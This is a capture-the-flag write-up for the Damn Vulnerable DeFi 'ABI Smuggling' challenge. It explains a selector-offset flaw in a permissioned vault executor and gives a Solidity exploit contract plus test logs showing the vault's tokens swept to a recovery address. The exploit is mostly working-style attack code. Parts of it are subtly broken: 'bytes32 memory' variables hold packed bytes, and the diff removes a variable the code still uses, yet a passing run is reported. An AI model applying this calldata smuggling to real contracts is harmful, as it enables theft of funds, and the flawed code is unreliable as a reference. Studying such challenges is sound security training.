# Damn Vulnerable Defi - ABI Smuggling
- Scope
    - AuthorizedExecutor.sol  
    - SelfAuthorizedVault.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Vulnerability Details
1. The calldataOffset calculation allows us 'smuggle' any function call, as long as the position starting after 4+32*3 is an action that is approved `withdraw()`
2. There is no checks to determine how long the encoded bytes is, hence you is no maximum limit to the size of the bytes and we can sneak in malicious call data

```diff
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
-        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }
```

### Impact/Proof of Concept
`execute()[4bytes]` `target[32bytes]` `offset_pointer[32bytes]` `Empty_Space[32bytes]` `withdraw()[32bytes]` `actionDataLength[32bytes]` `actionData[68bytes]`
1. First is add the `execute()` selector to call it
2. Next, we need to set the target of the calldata, which is the vault
3. Following, we need to tell the ABI the offset/location of the real actionData to start from, which should be from 0x80(128 bytes).  
4. This just need to be empty, so that it will pad the bytes to 4 + 32 * 3 bytes. Hence we just provide an empty bytes32()
5. This is the position where the `selector` is chosen. We need a `selector` that is an approved ActionId, which is `withdraw()` selector.
6. This portion we will include the length of the malicious bytes data to be read
7. Lastly, we include the malicious bytes data that will call `sweepFunds()`

```diff
function test_abiSmuggling() public checkSolvedByPlayer {
        console.log("vault balance: ", token.balanceOf(address(vault)));
        Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
        console.log("vault balance: ", token.balanceOf(address(vault)));
        console.log("recovery balance: ", token.balanceOf(address(recovery)));
    }

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    // Event declarations for logging
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {
        require(msg.sender == player, "Only player can execute exploit");

        // `execute()` function selector
        bytes4 executeSelector = vault.execute.selector;

        // Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes32 memory target = abi.encodePacked(bytes12(0), address(vault));

        // Construct the calldata start location offset
        bytes32 memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data

        // Construct the empty data filler (32 bytes of zeros)
        bytes32 memory emptyData = abi.encodePacked(uint256(0));

        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
        bytes32 memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // Withdraw function selector
            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes32 memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68 bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // Combine all parts to create the complete calldata payload
        bytes32 memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
        );

        // Emit the calldata payload for debugging
        emit LogCalldataPayload(calldataPayload);

        // Return the constructed calldata payload
        return calldataPayload;
    }
}
```

Results
```diff
[PASS] test_abiSmuggling() (gas: 397270)
Logs:
  vault balance:  1000000000000000000000000
  vault balance:  0
  recovery balance:  1000000000000000000000000
```

